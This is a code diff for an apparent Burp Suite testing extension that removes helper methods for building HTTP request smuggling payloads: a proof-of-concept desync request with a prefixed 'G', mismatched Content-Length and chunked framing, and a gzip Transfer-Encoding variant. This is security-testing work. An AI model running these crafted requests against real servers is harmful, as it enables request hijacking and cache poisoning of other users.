@@ -88,60 +88,6 @@ class Utilities {
         }
     }
 
-    static Resp buildPoc(byte[] req, IHttpService service) {
-        try {
-            byte[] badMethodIfChunked = Utilities.setHeader(req, "Connection", "keep-alive");
-            badMethodIfChunked = makeChunked(badMethodIfChunked, 1, 0);
-
-            ByteArrayOutputStream buf = new ByteArrayOutputStream();
-            buf.write(badMethodIfChunked);
-            buf.write("G".getBytes());
-
-            // first request ends here
-            buf.write(makeChunked(req, 0, 0));
-            return new Resp(new Req(buf.toByteArray(), null, service));
-        }
-        catch (IOException e) {
-            throw new RuntimeException();
-        }
-    }
-
-    static byte[] gzipBody(byte[] baseReq) {
-        try {
-            byte[] req = Utilities.addOrReplaceHeader(baseReq, "Transfer-Encoding", "gzip");
-            String body = Utilities.getBody(req);
-            ByteArrayOutputStream out = new ByteArrayOutputStream();
-            GZIPOutputStream gzip = new GZIPOutputStream(out);
-            gzip.write(Utilities.helpers.stringToBytes(body));
-            gzip.close();
-            return Utilities.setBody(req, Utilities.helpers.bytesToString(out.toByteArray()));
-        } catch (Exception e) {
-            Utilities.err(e.getMessage());
-            return baseReq;
-        }
-    }
-
-    static byte[] makeChunked(byte[] baseReq, int contentLengthOffset, int chunkOffset) {
-        if (!Utilities.containsBytes("Transfer-Encoding".getBytes(), baseReq)) {
-            baseReq = Utilities.addOrReplaceHeader(baseReq, "Transfer-Encoding", "foo");
-        }
-
-        byte[] chunkedReq = Utilities.setHeader(baseReq, "Transfer-Encoding", "chunked");
-        int bodySize = baseReq.length - Utilities.getBodyStart(baseReq);
-        String body = Utilities.getBody(baseReq);
-        int chunkSize = bodySize+chunkOffset;
-        if (chunkSize > 0) {
-            chunkedReq = Utilities.setBody(chunkedReq, Integer.toHexString(chunkSize) + "\r\n" + body + "\r\n0\r\n\r\n");
-        }
-        else {
-            chunkedReq = Utilities.setBody(chunkedReq, "0\r\n\r\n");
-        }
-        bodySize = chunkedReq.length - Utilities.getBodyStart(chunkedReq);
-        String newContentLength = Integer.toString(bodySize+contentLengthOffset);
-        chunkedReq = Utilities.setHeader(chunkedReq, "Content-Length", newContentLength);
-        return chunkedReq;
-    }
-
 
     static int generate(int seed, int count, List<String> accumulator)
     {
